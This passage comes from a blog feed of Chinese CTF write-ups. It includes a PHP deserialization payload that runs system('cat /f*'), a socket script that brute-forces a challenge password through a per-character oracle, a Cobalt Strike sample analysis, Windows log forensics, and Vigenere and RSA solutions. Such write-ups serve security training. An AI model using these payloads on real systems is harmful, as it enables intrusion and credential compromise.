class=\"token operator\">-></span><span class=\"token property\">next</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">// O:2:\"wo\":3:&#123;s:3:\"sex\";s:3:\"boy\";s:3:\"age\";s:8:\"eighteen\";s:9:\"intention\";O:3:\"shi\":2:&#123;s:4:\"next\";O:4:\"Demo\":1:&#123;s:1:\"a\";N;&#125;s:4:\"pass\";s:7:\"cat /f*\";&#125;&#125;</span></span></pre></td></tr></table></figure><pre><code>POST: username=O:2:&quot;wo&quot;:3:&#123;s:3:&quot;sex&quot;;s:3:&quot;boy&quot;;s:3:&quot;age&quot;;s:8:&quot;eighteen&quot;;s:9:&quot;intention&quot;;O:3:&quot;shi&quot;:2:&#123;s:4:&quot;next&quot;;O:4:&quot;Demo&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:4:&quot;pass&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&amp;password=system\n</code></pre>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE</h2>\n<h3 id=\"来打cs咯\"><a class=\"markdownIt-Anchor\" href=\"#来打cs咯\">#</a> 来打 CS 咯</h3>\n<blockquote>\n<p>逆天 re，病毒分析，没拖进 ida 先拖到云沙箱里面分析一下，直接分析・出来了</p>\n</blockquote>\n<p><img data-src=\"/img/qsnctf_round1/RE.JPG\" alt=\"img\"></p>\n<p><img data-src=\"/img/qsnctf_round1/2.JPG\" alt=\"img\"></p>\n<blockquote>\n<p>在这里就看到了 ip 和端口，</p>\n</blockquote>\n<blockquote 10.0.80.253:8118=\"\">\n<p>flag：qsnctf</p>\n</blockquote>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2024/02/19/Sictf-round3-wp/",
            "url": "http://example.com/2024/02/19/Sictf-round3-wp/",
            "title": "Sictf-round3-wp",
            "date_published": "2024-02-19T04:33:34.000Z",
            "content_html": "<h1 id=\"sictf-round3-wp\"><a class=\"markdownIt-Anchor\" href=\"#sictf-round3-wp\">#</a> SICTF-round3-wp</h1>\n<p>题解：</p>\n<h3 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h3>\n<h4 id=\"geekchallege\"><a class=\"markdownIt-Anchor\" href=\"#geekchallege\">#</a> GeekChallege</h4>\n<blockquote>\n<p>最终分数 269 pts</p>\n</blockquote>\n<blockquote>\n<p>我的密码可是很长的呢！（nc）</p>\n</blockquote>\n<blockquote>\n<p>Rule:If the i-th character of the string you input is the same as the i-th character of my password, I will output a 1. Otherwise, I will output a 0. Keep guessing my password until you get it right, and I will give you flag</p>\n<p>Tip:len(array)=5&amp;&amp;len(passwd)=114</p>\n</blockquote>\n<p>已知规则为爆破密码，密码为 5 位长度的数组构成的 114 个密码</p>\n<p>所以先进行爆破数组，然后就可以快速爆破密码</p>\n<p>脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>HOST <span class=\"token operator\">=</span> <span class=\"token string\">'yuanshen.life'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>PORT <span class=\"token operator\">=</span> <span class=\"token number\">33615</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>characters <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>printable</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>password <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'?'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">114</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>known_chars <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">with</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>HOST<span class=\"token punctuation\">,</span> PORT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  banner <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">114</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>known_chars<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      chars <span class=\"token operator\">=</span> known_chars</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      chars <span class=\"token operator\">=</span> characters</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">for</span> char <span class=\"token keyword\">in</span> chars<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            attempt <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'?'</span><span class=\"token punctuation\">,</span> char<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            s<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>attempt <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            response <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">114</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                part <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                response <span class=\"token operator\">+=</span> part<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"TEST: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>attempt<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>response<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token keyword\">if</span> response<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                password<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> char</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                known_chars<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"FOUND </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>char<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> at </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Password:\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>result <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"whowhowho\"><a class=\"markdownIt-Anchor\" href=\"#whowhowho\">#</a> WHO?WHO?WHO</h4>\n<blockquote>\n<p>最终分数 438 pts</p>\n</blockquote>\n<blockquote>\n<p>题目描述：我不说是谁了！！！太渣了！！！呜呜呜！！！让我遍体鳞伤！！！</p>\n<p>压缩包密码为 6 位小写字母</p>\n<p>树木是渣男</p>\n</blockquote>\n<p>压缩包密码 6 位小写</p>\n<blockquote>\n<p>qweqwe</p>\n</blockquote>\n<p>得到文本内容，零宽</p>\n<blockquote>\n<p>U2FsdGVkX19uvldJ6CGUNff3B28QEdIjZqgUh98K+/0J16ELU8WVQydohw4P5+2M<br>\njbhTLQHNOpcoOd7kSRgy8pwpovCmimdD8M0IbYUeXjNKYePL/WP4PCMaOJHAW3HR<br>\nb7IEoDDH1NYh3o5NwMmcFEqy1ujf72VgQIQkaeYFFFE=</p>\n</blockquote>\n<p>兔子解密</p>\n<p>密钥 shumu</p>\n<blockquote GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT=\"\">\n<p>GTAGAGCTAGTCCTT</p>\n</blockquote>\n<p>DNA 加密</p>\n<blockquote Q1A0_Q1A0_GA0_SU_N1_SHUMU_SH1_ZHA_NAN=\"\">\n<p>SICTF</p>\n</blockquote>\n<h4 id=\"日志分析1\"><a class=\"markdownIt-Anchor\" href=\"#日志分析1\">#</a> 日志分析 1</h4>\n<blockquote>\n<p>最终分数 703 pts</p>\n</blockquote>\n<blockquote>\n<p>可恶的树魔王黑客居然控制了我的电脑，聪明的你一定能够识破树魔王的阴谋吧！<br>\nflag 格式为 SICTF {黑客所接入的 IP 地址 | 黑客所创建的用户名 | 黑客所加入的用户组 | 黑客创建的计划名 | 创建计划任务的对象后门所处的路径（小写盘符…, 后门路径精确到 ****.exe）| 黑客远程登陆 RDP 的账户}<br>\n 后门路径精确到 ****.exe</p>\n<p>后门路径精确到 ****.exe</p>\n<p>注意 system 的权限</p>\n<p>远程登录账户请加上用户域 (xxxxxxx\\xxxxxxx)</p>\n</blockquote>\n<p>所用工具</p>\n<blockquote>\n<p>Log Parser Lizard （需要自行设置 Maps 路径）</p>\n<p>windows 自带日志工具</p>\n</blockquote>\n<blockquote>\n<p>黑客所接入的 IP 地址</p>\n</blockquote>\n<p>payload data2 中搜索 Logon Type 10 (远程 rdp 连接)</p>\n<p>找到 Remote Host 为  WIN-WH8G5MDPHE5 (192.168.222.200)</p>\n<p>所以 IP 为 192.168.222.200</p>\n<blockquote>\n<p>黑客所创建的用户名</p>\n</blockquote>\n<p>Map Description 中搜索 A new account was created 或者在 Event ID 找 4720</p>\n<p>发现只有一条创建用户操作</p>\n<p>Target: ADOFLMB\\attack$ (S-1-5-21-867333373-202576419-2389709931-1103)</p>\n<p>所以用户为 attack$</p>\n<blockquote>\n<p>黑客所加入的用户组</p>\n</blockquote>\n<p>Map Description 中搜索 A member was added to a security-enabled local group 或者在 Event ID 找 4732</p>\n<p>只有一条记录</p>\n<p>payload data1 为 Target: Builtin\\Administrators (S-1-5-32-544)</p>\n<p>payload data4 为 MemberSid: S-1-5-21-867333373-202576419-2389709931-1103</p>\n<p>由前面可知 attack$ 的 SSID 为 S-1-5-21-867333373-202576419-2389709931-1103</p>\n<p>所以加入的用户组为 Administrators</p>\n<blockquote>\n<p>黑客创建的计划名</p>\n</blockquote>\n<p>Map Description 中搜索 Scheduled Task created 或者在 Event ID 找 4698</p>\n<p>只有一条记录</p>\n<p>payload data1 为 TaskName: \\callback</p>\n<p>所以创建的计划名为 callback</p>\n<blockquote>\n<p>创建计划任务的对象后门所处的路径（小写盘符…, 后门路径精确到 ****.exe）</p>\n</blockquote>\n<p>仍然是 4698</p>\n<p>在 payload 2 中发现计划内容</p>\n<p>其中后门路径为 c:\\windows\\system32\\windows_attack.exe</p>\n<blockquote>\n<p>黑客远程登陆 RDP 的账户 (加上用户域)</p>\n</blockquote>\n<p>需要在 windows 审计日志工具寻找</p>\n<p>需要事件 ID 为 4624</p>\n<blockquote>\n<p>使用者:<br>\n 安全 ID:\t\tSYSTEM<br>\n 帐户名:\t\tWIN-WH8G5MDPHE5$<br>\n 帐户域:\t\tADOFLMB<br>\n 登录 ID:\t\t0x3E7</p>\n<p>登录类型:\t\t\t10</p>\n<p 00000000-0000-0000-0000-000000000000=\"\">新登录:<br>\n 安全 ID:\t\tS-1-5-21-867333373-202576419-2389709931-1103<br>\n 帐户名:\t\tattack$<br>\n 帐户域:\t\tADOFLMB<br>\n 登录 ID:\t\t0x12A334<br>\n 登录 GUID:\t\t</p>\n<p>进程信息:<br>\n 进程 ID:\t\t0x974<br>\n 进程名:\t\tC:\\Windows\\System32\\winlogon.exe</p>\n<p>网络信息:<br>\n 工作站名:\tWIN-WH8G5MDPHE5<br>\n 源网络地址:\t192.168.222.200<br>\n 源端口:\t\t35186</p>\n<p>详细身份验证信息:<br>\n 登录进程:\t\tUser32<br>\n 身份验证数据包:\tNegotiate<br>\n 传递的服务:\t-<br>\n 数据包名 (仅限 NTLM):\t-<br>\n 密钥长度:\t\t0</p>\n<p>创建登录会话后，在被访问的计算机上生成此事件。</p>\n<p>“使用者” 字段指明本地系统上请求登录的帐户。这通常是一个服务 (例如 Server 服务) 或本地进程 (例如 Winlogon.exe 或 Services.exe)。</p>\n<p>“登录类型” 字段指明发生的登录种类。最常见的类型是 2 (交互式) 和 3 (网络)。</p>\n<p>“新登录” 字段指明新登录是为哪个帐户创建的，即登录的帐户。</p>\n<p>“网络” 字段指明远程登录请求来自哪里。“工作站名” 并非总是可用，而且在某些情况下可能会留为空白。</p>\n<p>模拟级别字段指明登录会话中的进程可以模拟的程度。</p>\n<p>“身份验证信息” 字段提供关于此特定登录请求的详细信息。<br>\n-“登录 GUID” 是可用于将此事件与 KDC 事件关联起来的唯一标识符。<br>\n-“传递的服务” 指明哪些中间服务参与了此登录请求。</p>\n<ul>\n<li>“数据包名” 指明在 NTLM 协议之间使用了哪些子协议。<br>\n-“密钥长度” 指明生成的会话密钥的长度。如果没有请求会话密钥，则此字段为 0。</li>\n</ul>\n</blockquote>\n<p>由此可见黑客远程登陆 RDP 的账户为 ADOFLMB\\attack$</p>\n<p>所以 flag 为 192.168.222.200|attack$|Administrators|callback|c:\\windows\\system32\\windows_attack.exe|ADOFLMB\\attact$</p>\n<h3 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> CRYPTO</h3>\n<h4 id=\"签到vigenere\"><a class=\"markdownIt-Anchor\" href=\"#签到vigenere\">#</a> [签到] Vigenere</h4>\n<blockquote>\n<p>最终分数 102 pts</p>\n</blockquote>\n<blockquote>\n<p>19 世纪末，无法破译的密码被应用于一场大规模内战，它在 20 世纪初期更是被认为是无法被转化的密码。后来，人们走到了 21 世纪，有着更高的算力，这种无法破译的密码也被高算力轻松攻破，你的任务便是使用你的高算力，跨越历史的长河，攻破这份密文！</p>\n</blockquote>\n<pre><code>Gn taj xirly gf Fxgjuakd, oe igywnd mt tegbs mnrxxlrivywd sngearbsw wakksre. Bs kpimj gf tank, it bx gur bslenmngn th jfdetagur mt ceei yze Ugnled Lystel tx Amxwaca gjmtrtq.\n\nAn taj wvegy gf tank nom xmccxjvinz, bw prhugse ts sllbffce hs lhe ytdlopnfg btxas wbyz Meqnuo: Tafl we lmsll ffce wtw logxyzer tsv madj heavj logxyzer. Pj khaeq yivLNUTF&#123;4695vft9-fd68-4684-uj81-u6c1avg6uaft&#125;j yenxwgus ynfanvnsl snuhorm, ffd ag zfdekxlanwnfg og tmr ptwl thty Eexbhg is mt jechsiuek yze lhxl tekwatokd an Nxb Eexbhg, Teqfk, anw Fjizhss. Thx iwtabqk of ljltlxrwnt tww leyy lo yhz.\n\nQou tww inlyjucmjv to bsxorf yze Pkjkidxsl [of Fjpich] tx thx ftovx nf thx ljeamjkt chsxidxsue al xgon tx at il hwrttnf thty lhekj oile gw an hzlbrxfc of pfj wimm lhe Nsatew Xlatxx snd lzygely lham yze Pkjkidxsl, on ank owg nfitbflivx, nfvimj Bapts lo ifrwdityw adajjenvj oita yzis iqsn; am yze strw tifj, gffxw lo mxiaatx gwtwxjf Jaiff anw tmrsxqnes.\n\nIqwasx hsll mt lhe tylenmngn oy yze Pkjkidxsl thty lhe kzlhlxxk emiqgymxsl of hzj suursrigjk nop txfekx lhe iwgspxhl of vtepeeqang Xsylagi lo mtpw pethw in t kww mhslhs.\n</code></pre>\n<p>网址 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ3ViYWxsYS5kZS92aWdlbmVyZS1zb2x2ZXI=\">Vigenere Solver | guballa.de</span></p>\n<h4 id=\"铜匠\"><a class=\"markdownIt-Anchor\" href=\"#铜匠\">#</a> 铜匠</h4>\n<blockquote>\n<p>最终分数 759 pts</p>\n</blockquote>\n<blockquote>\n<p>三年二班的皮郜伟同学，他的理想是做一名铜匠，为此他决定深入学习关于铜匠的知识</p>\n</blockquote>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> enc <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Decimal_conversion</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> num <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">'0'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    digits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">while</span> num<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        digits<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        num <span class=\"token operator\">//=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span>digits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"leak = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>Decimal_conversion<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">112]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"e = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>leak = 2011133132443111302000224204142244403203442000141102312242343143241244243020003333022112141220422134444214010012</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>n = 85988668134257353631742597258304937106964673395852009846703777410474172989069717247424903079500594820235304351355706519069516847244761609583338251489134035212061654870087550317540291994559481862615812258493738064606592165529948648774081655902831715928483206013332330998262897765489820121129058926463847702821</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>e = 65537</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>c = 64708526479058278743788046708923650158905888858865427385501446781738669889375403360886995849554813207230509920789341593771929287415439407977283018525484281064769128358863513387658744063469874845446480637925790150835186431234289848506337341595817156444941964510251032210939739594241869190746437858135599624562</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>'''</span></pre></td></tr></table></figure><p>首先还原 p 高位</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Decimal_conversion</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> num <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">'0'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    digits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">while</span> num<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        digits<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        num <span class=\"token operator\">//=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\"># print(''.join(reversed(digits)))</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span>digits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>leak <span class=\"token operator\">=</span> Decimal_conversion<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>leak1 <span class=\"token operator\">=</span> <span class=\"token string\">'2011133132443111302000224204142244403203442000141102312242343143241244243020003333022112141220422134444214010012'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decimal_conversion_back</span><span class=\"token punctuation\">(</span>num_in_base_5_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    num_in_base_10 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">for</span> index<span class=\"token punctuation\">,</span> digit <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span>num_in_base_5_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        num_in_base_10 <span class=\"token operator\">+=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>digit<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token 